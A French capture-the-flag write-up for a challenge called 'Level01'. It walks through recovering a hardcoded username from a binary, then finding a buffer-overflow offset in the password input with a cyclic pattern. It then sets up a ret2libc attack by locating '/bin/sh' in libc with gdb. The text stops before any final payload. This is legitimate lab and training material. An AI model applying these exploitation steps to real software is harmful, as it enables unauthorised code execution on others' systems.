**

## Level01

Lorsqu’on lance le programme, celui-ci nous demande un login.

  

On ouvre le programme sur cutter, on trouve que  verify_user_name(); est appelée.

  

On cherche donc dans cette fonction et on trouve une string : “dat_wil”. On essaie alors d’entrer cette string en tant qu’username et cela nous permet d’accéder au champ password.

  

On voit dans cutter une string “admin” qui est comparée. On essaie alors d’entrer “admin” en password, mais ça ne fonctionne pas.

  

Essayons de buffer overflow le fgets du password :

  

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()

0x37634136 nous donne un offset de 80.

Le problème c’est qu’on ne voit pas de /bin/sh dans le programme. On va donc essayer de la trouver avec une ret2libc attack.

    (gdb) b *main+173
    Breakpoint 1 at 0x804857d
    
    (gdb) info proc map
    process 1857
    Mapped address spaces:
    Start Addr End Addr Size Offset objfile
    0x8048000 0x8049000 0x1000 0x0 /home/users/level01/level01
    0x8049000 0x804a000 0x1000 0x0 /home/users/level01/level01
    0x804a000 0x804b000 0x1000 0x1000 /home/users/level01/level01
    0xf7e2b000 0xf7e2c000 0x1000 0x0
    0xf7e2c000 0xf7fcc000 0x1a0000 0x0 /lib32/libc-2.15.so
    0xf7fcc000 0xf7fcd000 0x1000 0x1a0000 /lib32/libc-2.15.so
    0xf7fcd000 0xf7fcf000 0x2000 0x1a0000 /lib32/libc-2.15.so
    0xf7fcf000 0xf7fd0000 0x1000 0x1a2000 /lib32/libc-2.15.so
    0xf7fd0000 0xf7fd4000 0x4000 0x0
    0xf7fd8000 0xf7fdb000 0x3000 0x0
    0xf7fdb000 0xf7fdc000 0x1000 0x0 [vdso]
    0xf7fdc000 0xf7ffc000  0x20000 0x0 /lib32/ld-2.15.so
    0xf7ffc000 0xf7ffd000 0x1000  0x1f000 /lib32/ld-2.15.so
    0xf7ffd000 0xf7ffe000 0x1000  0x20000 /lib32/ld-2.15.so
    0xfffdd000 0xffffe000  0x21000 0x0 [stack]

    (gdb) find 0xf7e2b000,0xf7ffdd00,"bin/sh"
    (gdb) 0xf7f897ed
		1 pattern found.
    (gdb) info function system

